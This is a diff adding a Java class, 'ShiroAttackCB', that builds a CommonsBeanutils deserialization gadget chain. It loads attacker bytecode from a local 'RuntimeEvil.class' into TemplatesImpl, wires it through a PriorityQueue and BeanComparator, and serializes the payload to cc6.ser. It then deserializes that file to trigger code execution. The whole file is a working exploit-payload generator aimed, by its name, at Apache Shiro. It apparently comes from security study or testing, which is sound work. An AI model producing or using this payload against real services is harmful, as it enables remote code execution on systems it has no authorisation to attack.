@@ -1,0 +1,55 @@
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class ShiroAttackCB {
+    public static void main(String[] args) throws Exception {
+        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\RuntimeEvil.class"));
+        TemplatesImpl templatesClass = new TemplatesImpl();
+        Field[] fields = templatesClass.getClass().getDeclaredFields();
+        for (Field field : fields) {
+            field.setAccessible(true);
+            if (field.getName().equals("_bytecodes")) {
+                field.set(templatesClass, new byte[][]{code1});
+            } else if (field.getName().equals("_name")) {
+                field.set(templatesClass, "godown");
+            } else if (field.getName().equals("_tfactory")) {
+                field.set(templatesClass, new TransformerFactoryImpl());
+            }
+        }
+        BeanComparator beanComparator = new BeanComparator("outputProperties");
+        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
+        priorityQueue.add(templatesClass);
+        priorityQueue.add(templatesClass);
+        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
+        compareField.setAccessible(true);
+        compareField.set(priorityQueue,beanComparator);
+        serialize(priorityQueue);
+        unserialize("cc6.ser");
+    }
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static Object unserialize(String filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
